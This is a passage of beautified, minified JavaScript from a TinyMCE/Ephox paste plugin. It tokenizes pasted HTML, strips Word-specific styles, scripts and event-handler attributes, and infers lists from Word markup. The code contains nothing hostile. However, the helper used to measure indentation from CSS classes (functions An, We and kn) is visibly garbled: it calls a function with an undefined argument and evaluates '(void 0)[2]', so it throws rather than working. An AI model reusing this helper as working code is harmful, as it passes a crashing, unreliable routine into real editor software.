    pt = function (e, t) {
      var n = e.dom()
      return !(!n || !n.hasAttribute) && n.hasAttribute(t)
    },
    gt = function (e, t) {
      e.dom().removeAttribute(t)
    },
    vt = function (e) {
      if (null == e) throw new Error("Node cannot be null or undefined")
      return {
        dom: y(e),
      }
    },
    ht = {
      fromHtml: function (e, t) {
        var n = (t || g.document).createElement("div")
        if (((n.innerHTML = e), !n.hasChildNodes() || 1 < n.childNodes.length))
          throw (
            (g.console.error("HTML does not have a single root node", e),
            new Error("HTML must have a single root node"))
          )
        return vt(n.childNodes[0])
      },
      fromTag: function (e, t) {
        var n = (t || g.document).createElement(e)
        return vt(n)
      },
      fromText: function (e, t) {
        var n = (t || g.document).createTextNode(e)
        return vt(n)
      },
      fromDom: vt,
      fromPoint: function (e, t, n) {
        var r = e.dom()
        return N.from(r.elementFromPoint(t, n)).map(vt)
      },
    },
    yt = {
      "cement.dialog.paste.title": "Paste Formatting Options",
      "cement.dialog.paste.instructions":
        "Choose to keep or remove formatting in the pasted content.",
      "cement.dialog.paste.merge": "Keep Formatting",
      "cement.dialog.paste.clean": "Remove Formatting",
      "loading.wait": "Please wait...",
      "safari.imagepaste":
        'Safari does not support direct paste of images. <a href="https://support.ephox.com/entries/88543243-Safari-Direct-paste-of-images-does-not-work" style="text-decoration: underline">More information on image pasting for Safari</a>',
      "webview.imagepaste":
        'Safari does not support direct paste of images. <a href="https://support.ephox.com/entries/88543243-Safari-Direct-paste-of-images-does-not-work" style="text-decoration: underline">More information on image pasting for Safari</a>',
      "error.code.images.not.found": "The images service was not found: (",
      "error.imageupload": "Image failed to upload: (",
      "error.full.stop": ").",
      "errors.local.images.disallowed":
        "Local image paste has been disabled. Local images have been removed from pasted content.",
      "errors.imageimport.failed": "Some images failed to import.",
      "errors.imageimport.unsupported": "Unsupported image type.",
      "errors.imageimport.invalid": "Image is invalid.",
    },
    bt = {
      translate: function (e) {
        return tinymce.translate(yt[e])
      },
    },
    Tt = {
      insert: function (e, t) {
        var n,
          r = t.getDoc(),
          o = "ephoxInsertMarker",
          i = t.selection,
          a = t.dom
        i.setContent('<span id="' + o + '">&nbsp;</span>'), (n = a.get(o))
        for (
          var u = r.createDocumentFragment();
          e.firstChild && !a.isBlock(e.firstChild);

        )
          u.appendChild(e.firstChild)
        for (
          var c = r.createDocumentFragment();
          e.lastChild && !a.isBlock(e.lastChild);

        )
          c.appendChild(e.lastChild)
        if (
          (n.parentNode.insertBefore(u, n), a.insertAfter(c, n), e.firstChild)
        ) {
          if (a.isBlock(e.firstChild)) {
            for (; !a.isBlock(n.parentNode) && n.parentNode !== a.getRoot(); )
              n = a.split(n.parentNode, n)
            a.is(n.parentNode, "td,th") ||
              n.parentNode === a.getRoot() ||
              (n = a.split(n.parentNode, n))
          }
          a.replace(e, n)
        } else a.remove(n)
      },
    },
    xt = {
      each: tinymce.each,
      trim: tinymce.trim,
      bind: function (e, t) {
        return function () {
          return e.apply(t, arguments)
        }
      },
      extend: function (n) {
        for (var e = [], t = 1; t < arguments.length; t++)
          e[t - 1] = arguments[t]
        return (
          tinymce.each(Array.prototype.slice.call(arguments, 1), function (e) {
            for (var t in e) n[t] = e[t]
          }),
          n
        )
      },
      ephoxGetComputedStyle: function (e) {
        return e.ownerDocument.defaultView
          ? e.ownerDocument.defaultView.getComputedStyle(e, null)
          : e.currentStyle || {}
      },
      log: function (e) {
        "undefined" != typeof console && console.log && console.log(e)
      },
      compose: function (e) {
        var r = Array.prototype.slice.call(e).reverse()
        return function (e) {
          for (var t = e, n = 0; n < r.length; n++) t = (0, r[n])(t)
          return t
        }
      },
    },
    Et = {
      strip_class_attributes: "all",
      retain_style_properties: "none",
    },
    wt = {
      strip_class_attributes: "none",
      retain_style_properties: "valid",
    },
    St = function (e, t, n) {
      var r = (function (e, t) {
        if (e && "string" != typeof e) return e
        switch (e) {
          case "clean":
            return Et
          case "merge":
            return wt
          default:
            return t
        }
      })(e, t)
      return (r = xt.extend(r, {
        base_64_images: n,
      }))
    },
    It = {
      create: function (e, t, n) {
        var r = St(e, Et, n),
          o = St(t, wt, n),
          i = o
        return {
          setWordContent: function (e) {
            i = e ? r : o
          },
          get: function (e) {
            return i[e]
          },
        }
      },
    },
    Lt = "startElement",
    Nt = "endElement",
    _t = "text",
    Ct = "comment",
    Ot = function (o) {
      var i,
        t,
        a = 0,
        u = function () {
          return i
        }
      t = function () {
        return (
          (i = {}),
          (a = 0),
          xt.each(o.attributes, function (e) {
            var t,
              n = e.nodeName,
              r = e.value
            ;(!1 !== (t = e).specified ||
              ("name" === t.nodeName && "" !== t.value)) &&
              null != r &&
              ((i[n] = r), a++)
          }),
          void 0 === i.style &&
            o.style.cssText &&
            ((i.style = o.style.cssText), a++),
          (t = u),
          i
        )
      }
      var c,
        s,
        f = function (n) {
          xt.each(t(), function (e, t) {
            n(t, e)
          })
        }
      return {
        get: function (e) {
          return t()[e]
        },
        each: f,
        filter: function (e) {
          var n, r
          c || (s = t),
            (r = e),
            (c =
              (n = c) && r
                ? function (e, t) {
                    return r(e, n(e, t))
                  }
                : n || r),
            (t = function () {
              return (
                (t = s),
                f(function (e, t) {
                  var n = c(e, t)
                  null === n
                    ? (o.removeAttribute(e), delete i[e], a--)
                    : n !== t &&
                      ("class" === e ? (o.className = n) : o.setAttribute(e, n),
                      (i[e] = n))
                }),
                (t = u),
                i
              )
            })
        },
        getAttributes: function () {
          return t()
        },
        getAttributeCount: function () {
          return t(), a
        },
      }
    },
    Dt = function (e) {
      return e.replace(/-(.)/g, function (e, t) {
        return t.toUpperCase()
      })
    },
    Pt = !1,
    At = function (i, e, t) {
      var n, r, o, a, u, c, s, f, l, d
      switch (i.nodeType) {
        case 1:
          e
            ? (n = Nt)
            : ((n = Lt),
              (a = Ot(i)),
              (u = {}),
              (c = i),
              (s = function (e, t) {
                u[e] = t
              }),
              (null != (d = t || c.getAttribute("style")) && d.split) ||
                (d = c.style.cssText),
              xt.each(d.split(";"), function (e) {
                var t = e.indexOf(":")
                0 < t &&
                  ((f = xt.trim(e.substring(0, t))).toUpperCase() === f &&
                    (f = f.toLowerCase()),
                  (f = f.replace(/([A-Z])/g, function (e, t) {
                    return "-" + t.toLowerCase()
                  })),
                  (l = xt.trim(e.substring(t + 1))),
                  Pt || (Pt = 0 === f.indexOf("mso-")),
                  s(f, l))
              }),
              Pt || ((l = c.style["mso-list"]) && s("mso-list", l))),
            (r =
              "HTML" !== i.scopeName &&
              i.scopeName &&
              i.tagName &&
              i.tagName.indexOf(":") <= 0
                ? (i.scopeName + ":" + i.tagName).toUpperCase()
                : i.tagName)
          break
        case 3:
          ;(n = _t), (o = i.nodeValue)
          break
        case 8:
          ;(n = Ct), (o = i.nodeValue)
          break
        default:
          xt.log("WARNING: Unsupported node type encountered: " + i.nodeType)
      }
      var m = function () {
          return n
        },
        p = function (e) {
          n === Lt && a.filter(e)
        }
      return {
        getNode: function () {
          return a && a.getAttributes(), i
        },
        tag: function () {
          return r
        },
        type: m,
        text: function () {
          return o
        },
        toString: function () {
          return "Type: " + n + ", Tag: " + r + " Text: " + o
        },
        getAttribute: function (e) {
          return a.get(e.toLowerCase())
        },
        filterAttributes: p,
        filterStyles: function (r) {
          if (m() === Lt) {
            var o = ""
            xt.each(u, function (e, t) {
              var n = r(t, e)
              null === n
                ? (i.style.removeProperty
                    ? i.style.removeProperty(Dt(t))
                    : i.style.removeAttribute(Dt(t)),
                  delete u[t])
                : ((o += t + ": " + n + "; "), (u[t] = n))
            }),
              (o = o || null),
              p(function (e, t) {
                return "style" === e ? o : t
              }),
              (i.style.cssText = o)
          }
        },
        getAttributeCount: function () {
          return a.getAttributeCount()
        },
        attributes: function (e) {
          a.each(e)
        },
        getStyle: function (e) {
          return u[e]
        },
        styles: function (n) {
          xt.each(u, function (e, t) {
            n(t, e)
          })
        },
        getComputedStyle: function () {
          return xt.ephoxGetComputedStyle(i)
        },
        isWhitespace: function () {
          return n === _t && /^[\s\u00A0]*$/.test(o)
        },
      }
    },
    kt = function (e, t) {
      return At(t.createElement(e), !0)
    },
    Mt = kt("HTML", window.document),
    Rt = {
      START_ELEMENT_TYPE: Lt,
      END_ELEMENT_TYPE: Nt,
      TEXT_TYPE: _t,
      COMMENT_TYPE: Ct,
      FINISHED: Mt,
      token: At,
      createStartElement: function (e, t, n, r) {
        var o = r.createElement(e),
          i = ""
        return (
          xt.each(t, function (e, t) {
            o.setAttribute(t, e)
          }),
          xt.each(n, function (e, t) {
            ;(i += t + ":" + e + ";"), (o.style[Dt(t)] = e)
          }),
          At(o, !1, "" !== i ? i : null)
        )
      },
      createEndElement: kt,
      createComment: function (e, t) {
        return At(t.createComment(e), !1)
      },
      createText: function (e, t) {
        return At(t.createTextNode(e))
      },
    },
    Ft = function (i) {
      var a = i.createDocumentFragment(),
        u = function (e) {
          a.appendChild(e)
        }
      return {
        dom: a,
        receive: function (e) {
          var t, n, r, o
          switch (e.type()) {
            case Rt.START_ELEMENT_TYPE:
              ;(o = e.getNode().cloneNode(!1)), u((r = o)), (a = r)
              break
            case Rt.TEXT_TYPE:
              ;(t = e), (n = i.createTextNode(t.text())), u(n)
              break
            case Rt.END_ELEMENT_TYPE:
              a = a.parentNode
              break
            case Rt.COMMENT_TYPE:
              break
            default:
              throw {
                message: "Unsupported token type: " + e.type(),
              }
          }
        },
      }
    },
    jt = function (e, o) {
      var i
      ;(o = o || window.document),
        (i = o.createElement("div")),
        o.body.appendChild(i),
        (i.style.position = "absolute"),
        (i.style.left = "-10000px"),
        (i.innerHTML = e)
      var a = i.firstChild || Rt.FINISHED,
        u = [],
        c = !1
      return {
        hasNext: function () {
          return void 0 !== a
        },
        next: function () {
          var e,
            t,
            n = a,
            r = c
          return (
            !c && a.firstChild
              ? (u.push(a), (a = a.firstChild))
              : c || 1 !== a.nodeType
              ? a.nextSibling
                ? ((a = a.nextSibling), (c = !1))
                : ((a = u.pop()), (c = !0))
              : (c = !0),
            n === Rt.FINISHED ||
              a ||
              (o.body.removeChild(i), (a = Rt.FINISHED)),
            (t = r),
            (e = n) === Rt.FINISHED ? e : e ? Rt.token(e, t) : void 0
          )
        },
      }
    },
    Ut = function (p, g) {
      return function (t, e, n) {
        var r,
          o,
          i,
          a = !1,
          u = function () {
            g && g(m), (a = !1), (o = []), (i = [])
          },
          c = function (e) {
            xt.each(e, function (e) {
              t.receive(e)
            })
          },
          s = function (e) {
            a ? i.push(e) : t.receive(e)
          },
          f = function () {
            l(), c(i), u()
          },
          l = function () {
            xt.each(r, function (e) {
              s(e)
            }),
              d()
          },
          d = function () {
            r = []
          },
          m = {
            document: n || window.document,
            settings: e || {},
            emit: s,
            receive: function (e) {
              g && o.push(e), p(m, e), e === Rt.FINISHED && f()
            },
            startTransaction: function () {
              a = !0
            },
            rollback: function () {
              c(o), u()
            },
            commit: f,
            defer: function (e) {
              ;(r = r || []).push(e)
            },
            hasDeferred: function () {
              return r && 0 < r.length
            },
            emitDeferred: l,
            dropDeferred: d,
          }
        return u(), m
      }
    },
    Bt = Ut,
    Yt = function (n) {
      return Ut(function (e, t) {
        t.filterAttributes(xt.bind(n, e)), e.emit(t)
      })
    },
    Wt =
      /^(P|H[1-6]|T[DH]|LI|DIV|BLOCKQUOTE|PRE|ADDRESS|FIELDSET|DD|DT|CENTER)$/,
    Ht = function () {
      return null
    },
    qt = !1,
    $t = Bt(function (e, t) {
      var n,
        r = function () {
          qt ||
            (e.emit(Rt.createStartElement("P", {}, {}, e.document)), (qt = !0))
        }
      switch (t.type()) {
        case Rt.TEXT_TYPE:
          r(), e.emit(t)
          break
        case Rt.END_ELEMENT_TYPE:
          qt && ((n = t), Wt.test(n.tag()) || t === Rt.FINISHED)
            ? (e.emit(Rt.createEndElement("P", e.document)), (qt = !1))
            : "BR" === t.tag() && e.emit(t)
          break
        case Rt.START_ELEMENT_TYPE:
          "BR" === t.tag()
            ? (t.filterAttributes(Ht), t.filterStyles(Ht), e.emit(t))
            : "IMG" === t.tag() &&
              t.getAttribute("alt") &&
              (r(), e.emit(Rt.createText(t.getAttribute("alt"), e.document)))
      }
      t === Rt.FINISHED && e.emit(t)
    }),
    Vt = function (e) {
      var t = e
      return 65279 === t.charCodeAt(t.length - 1)
        ? t.substring(0, t.length - 1)
        : e
    },
    Xt = [Vt],
    Gt =
      tinymce.isIE && 9 <= document.documentMode
        ? [
            function (e) {
              return e.replace(/<BR><BR>/g, "<br>")
            },
            function (e) {
              return e.replace(/<br>/g, " ")
            },
            function (e) {
              return e.replace(/<br><br>/g, "<BR><BR>")
            },
            function (e) {
              return /<(h[1-6r]|p|div|address|pre|form|table|tbody|thead|tfoot|th|tr|td|li|ol|ul|caption|blockquote|center|dl|dt|dd|dir|fieldset)/.test(
                e
              )
                ? e.replace(
                    /(?:<br>&nbsp;[\s\r\n]+|<br>)*(<\/?(h[1-6r]|p|div|address|pre|form|table|tbody|thead|tfoot|th|tr|td|li|ol|ul|caption|blockquote|center|dl|dt|dd|dir|fieldset)[^>]*>)(?:<br>&nbsp;[\s\r\n]+|<br>)*/g,
                    "$1"
                  )
                : e
            },
          ].concat(Xt)
        : Xt,
    Kt = {
      all: xt.compose(Gt),
      textOnly: Vt,
    },
    zt =
      /^(mso-.*|tab-stops|tab-interval|language|text-underline|text-effect|text-line-through|font-color|horiz-align|list-image-[0-9]+|separator-image|table-border-color-(dark|light)|vert-align|vnd\..*)$/,
    Jt = Bt(function (e, t) {
      var r,
        n = e.settings.get("retain_style_properties")
      t.filterStyles(
        ((r = n),
        function (e, t) {
          var n = !1
          switch (r) {
            case "all":
            case "*":
              n = !0
              break
            case "valid":
              n = !zt.test(e)
              break
            case void 0:
            case "none":
              n = "list-style-type" === e
              break
            default:
              n = 0 <= ("," + r + ",").indexOf("," + e + ",")
          }
          return n ? t : null
        })
      ),
        e.emit(t)
    }),
    Zt = Bt(function (e, t) {
      e.seenList ||
        (e.inferring
          ? "LI" === t.tag() &&
            (t.type() === Rt.START_ELEMENT_TYPE
              ? e.inferring++
              : (e.inferring--, e.inferring || (e.needsClosing = !0)))
          : ("OL" === t.tag() || "UL" === t.tag()
              ? (e.seenList = !0)
              : "LI" === t.tag() &&
                ((e.inferring = 1),
                e.needsClosing ||
                  e.emit(Rt.createStartElement("UL", {}, {}, e.document))),
            !e.needsClosing ||
              e.inferring ||
              t.isWhitespace() ||
              ((e.needsClosing = !1),
              e.emit(Rt.createEndElement("UL", e.document))))),
        e.emit(t)
    }),
    Qt = Yt(function (e, t) {
      return "name" === e || "id" === e ? null : t
    }),
    en = Yt(function (e, t) {
      if ("class" === e)
        switch (this.settings.get("strip_class_attributes")) {
          case "mso":
            return 0 === t.indexOf("Mso") ? null : t
          case "none":
            return t
          default:
            return null
        }
      return t
    }),
    tn = (function () {
      if (
        0 < navigator.userAgent.indexOf("Gecko") &&
        navigator.userAgent.indexOf("WebKit") < 0
      )
        return !1
      var e = document.createElement("div")
      try {
        e.innerHTML = '<p style="mso-list: Ignore;">&nbsp;</p>'
      } catch (e) {
        return !1
      }
      return "Ignore" === Rt.token(e.firstChild).getStyle("mso-list")
    })(),
    nn = function (e, t) {
      return e.type() === Rt.START_ELEMENT_TYPE
        ? 0 === e.getAttributeCount() ||
            (t &&
              1 === e.getAttributeCount() &&
              null !== e.getAttribute("style") &&
              void 0 !== e.getAttribute("style"))
        : e.type() === Rt.END_ELEMENT_TYPE
    },
    rn = tn,
    on = function (e) {
      return "A" === e.tag() || "SPAN" === e.tag()
    },
    an = function (e) {
      var t = e.getStyle("mso-list")
      return t && "skip" !== t
    },
    un = [],
    cn = [],
    sn = !1,
    fn = function (e, t) {
      var n,
        r,
        o = 1
      for (n = t + 1; n < e; n++)
        if ((r = un[n]) && "SPAN" === r.tag())
          if (r.type() === Rt.START_ELEMENT_TYPE) o++
          else if (r.type() === Rt.END_ELEMENT_TYPE && 0 === --o)
            return void (un[n] = null)
    },
    ln = function (e, t) {
      if ((un.push(t), (cn = cn || []), t.type() === Rt.START_ELEMENT_TYPE))
        cn.push(t)
      else if (t.type() === Rt.END_ELEMENT_TYPE && (cn.pop(), 0 === cn.length))
        return void (function (e) {
          if (sn) {
            var t = void 0,
              n = un.length,
              r = void 0
            for (r = 0; r < n; r++)
              (t = un[r]) &&
                (t.type() === Rt.START_ELEMENT_TYPE &&
                "SPAN" === t.tag() &&
                nn(t)
                  ? fn(n, r)
                  : e.emit(t))
          }
          ;(un = []), (cn = []), (sn = !1)
        })(e)
    },
    dn = Bt(function (e, t) {
      var n = function (e) {
        return !(
          0 <=
            ",FONT,EM,STRONG,SAMP,ACRONYM,CITE,CODE,DFN,KBD,TT,B,I,U,S,SUB,SUP,INS,DEL,VAR,SPAN,".indexOf(
              "," + e.tag() + ","
            ) && nn(e, !0)
        )
      }
      0 === (un = un || []).length
        ? t.type() === Rt.START_ELEMENT_TYPE
          ? n(t)
            ? e.emit(t)
            : ln(e, t)
          : e.emit(t)
        : (sn || (sn = n(t)), ln(e, t))
    }),
    mn = Yt(function (e, t) {
      return "style" === e && "" === t ? null : t
    }),
    pn = Yt(function (e, t) {
      return "lang" === e ? null : t
    }),
    gn = Bt(function (e, t) {
      if ("IMG" === t.tag()) {
        if (t.type() === Rt.END_ELEMENT_TYPE && e.skipEnd)
          return void (e.skipEnd = !1)
        if (t.type() === Rt.START_ELEMENT_TYPE) {
          if (/^file:/.test(t.getAttribute("src"))) return void (e.skipEnd = !0)
          if (
            e.settings.get("base_64_images") &&
            /^data:image\/.*;base64/.test(t.getAttribute("src"))
          )
            return void (e.skipEnd = !0)
        }
      }
      e.emit(t)
    }),
    vn = Bt(function (e, t) {
      "META" !== t.tag() && "LINK" !== t.tag() && e.emit(t)
    }),
    hn = function (e) {
      return !nn(e) && !/^OLE_LINK/.test(e.getAttribute("name"))
    },
    yn = [],
    bn = Bt(function (e, t) {
      var n
      t.type() === Rt.START_ELEMENT_TYPE && "A" === t.tag()
        ? (yn.push(t), hn(t) && e.defer(t))
        : t.type() === Rt.END_ELEMENT_TYPE && "A" === t.tag()
        ? ((n = yn.pop()),
          hn(n) && e.defer(t),
          0 === yn.length && e.emitDeferred())
        : e.hasDeferred()
        ? e.defer(t)
        : e.emit(t)
    }),
    Tn = !1,
    xn = [
      Bt(function (e, t) {
        "SCRIPT" === t.tag()
          ? (Tn = t.type() === Rt.START_ELEMENT_TYPE)
          : Tn ||
            (t.filterAttributes(function (e, t) {
              return /^on/.test(e) || "language" === e ? null : t
            }),
            e.emit(t))
      }),
      Qt,
      gn,
      Jt,
      pn,
      mn,
      en,
      bn,
      dn,
      vn,
      Zt,
    ],
    En = Bt(function (e, n) {
      n.filterAttributes(function (e, t) {
        return "align" === e
          ? null
          : ("UL" !== n.tag() && "OL" !== n.tag()) || "type" !== e
          ? t
          : null
      }),
        e.emit(n)
    }),
    wn = Yt(function (e, t) {
      return /^xmlns(:|$)/.test(e) ? null : t
    }),
    Sn = Bt(function (e, t) {
      ;(t.tag && /^([OVWXP]|U[0-9]+|ST[0-9]+):/.test(t.tag())) || e.emit(t)
    }),
    In = Yt(function (e, t) {
      return "href" === e &&
        (0 <= t.indexOf("#_Toc") || 0 <= t.indexOf("#_mso"))
        ? null
        : t
    }),
    Ln = Yt(function (e, t) {
      return /^v:/.test(e) ? null : t
    }),
    Nn = [
      {
        regex: /^\(?[dc][\.\)]$/,
        type: {
          tag: "OL",
          type: "lower-alpha",
        },
      },
      {
        regex: /^\(?[DC][\.\)]$/,
        type: {
          tag: "OL",
          type: "upper-alpha",
        },
      },
      {
        regex: /^\(?M*(CM|CD|D?C{0,3})(XC|XL|L?X{0,3})(IX|IV|V?I{0,3})[\.\)]$/,
        type: {
          tag: "OL",
          type: "upper-roman",
        },
      },
      {
        regex: /^\(?m*(cm|cd|d?c{0,3})(xc|xl|l?x{0,3})(ix|iv|v?i{0,3})[\.\)]$/,
        type: {
          tag: "OL",
          type: "lower-roman",
        },
      },
      {
        regex: /^\(?[0-9]+[\.\)]$/,
        type: {
          tag: "OL",
        },
      },
      {
        regex: /^([0-9]+\.)*[0-9]+\.?$/,
        type: {
          tag: "OL",
          variant: "outline",
        },
      },
      {
        regex: /^\(?[a-z]+[\.\)]$/,
        type: {
          tag: "OL",
          type: "lower-alpha",
        },
      },
      {
        regex: /^\(?[A-Z]+[\.\)]$/,
        type: {
          tag: "OL",
          type: "upper-alpha",
        },
      },
    ],
    _n = {
      "\u2022": {
        tag: "UL",
        type: "disc",
      },
      "\xb7": {
        tag: "UL",
        type: "disc",
      },
      "\xa7": {
        tag: "UL",
        type: "square",
      },
    },
    Cn = {
      o: {
        tag: "UL",
        type: "circle",
      },
      "-": {
        tag: "UL",
        type: "disc",
      },
      "\u25cf": {
        tag: "UL",
        type: "disc",
      },
    },
    On = function (e, t) {
      var n = {
        tag: e.tag,
        type: e.type,
        variant: t,
      }
      return e.start && (n.start = e.start), e.type || delete n.type, n
    },
    Dn = function (e, t, n) {
      return (
        e === t ||
        (e &&
          t &&
          e.tag === t.tag &&
          e.type === t.type &&
          (n || e.variant === t.variant))
      )
    },
    Pn = {
      guessListType: function (e, t, n) {
        var r,
          o,
          i,
          a = null
        return (
          e && ((r = e.text), (o = e.symbolFont)),
          (r = xt.trim(r)),
          (a = Cn[r])
            ? (a = On(a, r))
            : o
            ? (a = (a = _n[r])
                ? On(a, r)
                : {
                    tag: "UL",
                    variant: r,
                  })
            : (xt.each(Nn, function (e) {
                if (e.regex.test(r)) {
                  if (t && Dn(e.type, t, !0))
                    return ((a = e.type).start = parseInt(r, 10)), !1
                  a || (a = e.type), (a.start = parseInt(r, 10))
                }
              }),
              a &&
                !a.variant &&
                ((i =
                  "(" === r.charAt(0)
                    ? "()"
                    : ")" === r.charAt(r.length - 1)
                    ? ")"
                    : "."),
                (a = On(a, i)))),
          a &&
            "OL" === a.tag &&
            n &&
            ("P" !== n.tag() || /^MsoHeading/.test(n.getAttribute("class"))) &&
            (a = null),
          a
        )
      },
      eqListType: Dn,
      checkFont: function (e, t) {
        if (e.type() === Rt.START_ELEMENT_TYPE) {
          var n = e.getStyle("font-family")
          n
            ? (t = "Wingdings" === n || "Symbol" === n)
            : /^(P|H[1-6]|DIV)$/.test(e.tag()) && (t = !1)
        }
        return t
      },
    },
    An = function (e) {
      var t = e.indexOf(".")
      if (0 <= t && void 0 === xt.trim(e.substring(t + 1)))
        return (void 0)[2], !1
    },
    kn =
      ((We = function (e, t) {
        var n,
          r = /([^{]+){([^}]+)}/g
        for (r.lastIndex = 0; null !== (n = r.exec(e)); )
          xt.each(n[1].split(","), An(void 0))
        return !1
      }),
      (He = {}),
      function (e, t) {
        var n,
          r = e + "," + t
        return He.hasOwnProperty(r)
          ? He[r]
          : ((n = We.call(null, e, t)), (He[r] = n))
      }),
    Mn = function (e, t) {
      var n,
        r,
        o,
        i = !1,
        a = function (e) {
          var t = e.style.fontFamily
          t && (i = "Wingdings" === t || "Symbol" === t)
        }
      if (
        e.type() === Rt.START_ELEMENT_TYPE &&
        t.openedTag &&
        "SPAN" === e.tag()
      ) {
        for (
          a((n = t.openedTag.getNode())),
            1 < n.childNodes.length &&
              "A" === n.firstChild.tagName &&
              "" === n.firstChild.textContent &&
              (n = n.childNodes[1]);
          n.firstChild &&
          ("SPAN" === n.firstChild.tagName || "A" === n.firstChild.tagName);

        )
          a((n = n.firstChild))
        if (!(n = n.firstChild) || 3 !== n.nodeType)
          return n && "IMG" === n.tagName
        if (
          ((r = n.value),
          xt.trim(r) || (r = (n = n.parentNode.nextSibling) ? n.value : ""),
          !n || xt.trim(n.parentNode.textContent) != r)
        )
          return !1
        if (
          (o = Pn.guessListType(
            {
              text: r,
              symbolFont: i,
            },
            null,
            t.originalToken
          ))
        )
          return (
            n.nextSibling &&
            "SPAN" === n.nextSibling.tagName &&
            /^[\u00A0\s]/.test(n.nextSibling.firstChild.value) &&
            ("P" === t.openedTag.tag() || "UL" === o.tag)
          )
      }
      return !1
    },
    Rn = function () {
      var a, u
      return {
        guessIndentLevel: function (e, t, n, r) {
          var o, i
          return r && /^([0-9]+\.)+[0-9]+\.?$/.test(r.text)
            ? r.text.replace(/([0-9]+|\.$)/g, "").length + 1
            : ((o = u || parseInt(kn(n, t.getAttribute("class")))),
              (i = (function (e, t) {
                var n,
                  r = 0
                for (n = e.parentNode; null != n && n !== t.parentNode; )
                  (r += n.offsetLeft), (n = n.offsetParent)
                return r
              })(e.getNode(), t.getNode())),
              o ? (a ? (i += a) : 0 === i && (i += a = o)) : (o = 48),
              (u = o = Math.min(i, o)),
              Math.max(1, Math.floor(i / o)) || 1)
        },
      }
    },
    Fn = function () {
      var t = !1
      return {
        check: function (e) {
          return t && e.type() === Rt.TEXT_TYPE
            ? (e.text(), !0)
            : e.type() === Rt.START_ELEMENT_TYPE && "STYLE" === e.tag()
            ? (t = !0)
            : e.type() === Rt.END_ELEMENT_TYPE &&
              "STYLE" === e.tag() &&
              !(t = !1)
        },
      }
    },
    jn = ["disc", "circle", "square"]
  function Un(a, u) {
    var i,
      o = [],
      c = [],
      s = 0,
      f = function (e, t) {
        var n = {},
          r = {}
        s++,
          t &&
            e.type &&
            (n = {
              "list-style-type": e.type,
            }),
          e.start &&
            1 < e.start &&
            (r = {
              start: e.start,
            }),
          o.push(e),
          a.emit(Rt.createStartElement(e.tag, r, n, u)),
          (i = e)
      },
      l = function () {
        a.emit(Rt.createEndElement(o.pop().tag, u)), s--, (i = o[o.length - 1])
      },
      d = function () {
        var e = c ? c.pop() : "P"
        "P" !== e && a.emit(Rt.createEndElement(e, u)),
          a.emit(Rt.createEndElement("LI", u))
      },
      m = function (e, t, n) {
        var r = {}
        if (e) {
          var o = e.getStyle("margin-left")
          void 0 !== o && (r["margin-left"] = o)
        } else r["list-style-type"] = "none"
        i &&
          !Pn.eqListType(i, t) &&
          (l(),
          n &&
            (a.emit(Rt.createStartElement("P", {}, {}, u)),
            a.emit(Rt.createText("\xa0", u)),
            a.emit(Rt.createEndElement("P", u))),
          f(t, !0)),
          a.emit(Rt.createStartElement("LI", {}, r, u)),
          e && "P" !== e.tag()
            ? (c.push(e.tag()),
              e.filterStyles(function () {
                return null
              }),
              a.emit(e))
            : c.push("P")
      }
    return {
      openList: f,
      closelist: l,
      closeAllLists: function () {
        for (; 0 < s; ) d(), l()
        a.commit()
      },
      closeItem: d,
      openLI: m,
      openItem: function (e, t, n, r) {
        if (n) {
          for (s || (s = 0); e < s; ) d(), l()
          var o, i
          if (
            ((i = e),
            "UL" === (o = n).tag &&
              jn[i - 1] === o.type &&
              (o = {
                tag: "UL",
              }),
            (n = o),
            s === e)
          )
            d(), m(t, n, r)
          else
            for (
              1 < e &&
              0 < c.length &&
              "P" !== c[c.length - 1] &&
              (a.emit(Rt.createEndElement(c[c.length - 1], u)),
              (c[c.length - 1] = "P"));
              s < e;

            )
              f(n, s === e - 1), m(s === e ? t : void 0, n)
        }
      },
      getCurrentListType: function () {
        return i
      },
      getCurrentLevel: function () {
        return s
      },
    }
  }
  var Bn = function (e, t) {
      xt.log("Unexpected token in list conversion: " + t.toString()),
        e.rollback()
    },
    Yn = function (e, t, n) {
      n.type() === Rt.TEXT_TYPE && "" === xt.trim(n.text())
        ? e.defer(n)
        : t.skippedPara ||
          n.type() !== Rt.START_ELEMENT_TYPE ||
          "P" !== n.tag() ||
          an(n)
        ? Hn(e, t, n)
        : ((t.openedTag = n), e.defer(n), (t.nextFilter = Wn))
    },
    Wn = function (e, t, n) {
      n.type() !== Rt.START_ELEMENT_TYPE ||
      "SPAN" !== n.tag() ||
      0 !== t.spanCount.length ||
      (!rn && Mn(n, t)) ||
      an(n)
        ? n.type() === Rt.END_ELEMENT_TYPE
          ? "SPAN" === n.tag()
            ? (e.defer(n), t.spanCount.pop())
            : "P" === n.tag()
            ? (e.defer(n),
              (t.skippedPara = !0),
              (t.openedTag = null),
              (t.nextFilter = Yn))
            : ((t.nextFilter = Hn), t.nextFilter(e, t, n))
          : n.isWhitespace()
          ? e.defer(n)
          : ((t.nextFilter = Hn), t.nextFilter(e, t, n))
        : (e.defer(n), t.spanCount.push(n))
    },
    Hn = function (e, t, n) {
      var r = function () {
        t.emitter.closeAllLists(),
          e.emitDeferred(),
          (t.openedTag = null),
          e.emit(n),
          (t.nextFilter = Hn)
      }
      if (n.type() === Rt.START_ELEMENT_TYPE && an(n) && "LI" !== n.tag()) {
        var o = / level([0-9]+)/.exec(n.getStyle("mso-list"))
        o && o[1]
          ? ((t.itemLevel = parseInt(o[1], 10) + t.styleLevelAdjust),
            t.nextFilter === Hn ? e.emitDeferred() : e.dropDeferred(),
            (t.nextFilter = $n),
            e.startTransaction(),
            (t.originalToken = n),
            (t.commentMode = !1))
          : r()
      } else
        !rn &&
        ((n.type() === Rt.COMMENT_TYPE && "[if !supportLists]" === n.text()) ||
          Mn(n, e))
          ? (n.type() === Rt.START_ELEMENT_TYPE &&
              "SPAN" === n.tag() &&
              t.spanCount.push(n),
            (t.nextFilter = $n),
            e.startTransaction(),
            (t.originalToken = t.openedTag),
            (t.commentMode = !0),
            (t.openedTag = null),
            e.dropDeferred())
          : n.type() === Rt.END_ELEMENT_TYPE && on(n)
          ? (e.defer(n), t.spanCount.pop())
          : n.type() === Rt.START_ELEMENT_TYPE
          ? on(n)
            ? (e.defer(n), t.spanCount.push(n))
            : (t.openedTag && (t.emitter.closeAllLists(), e.emitDeferred()),
              (t.openedTag = n),
              e.defer(n))
          : r()
    },
    qn = function (e, t, n) {
      n.type() === Rt.END_ELEMENT_TYPE &&
        t.originalToken.tag() === n.tag() &&
        ((t.nextFilter = Yn), (t.styleLevelAdjust = -1)),
        e.emit(n)
    },
    $n = function (e, t, n) {
      if (
        (n.type() === Rt.START_ELEMENT_TYPE &&
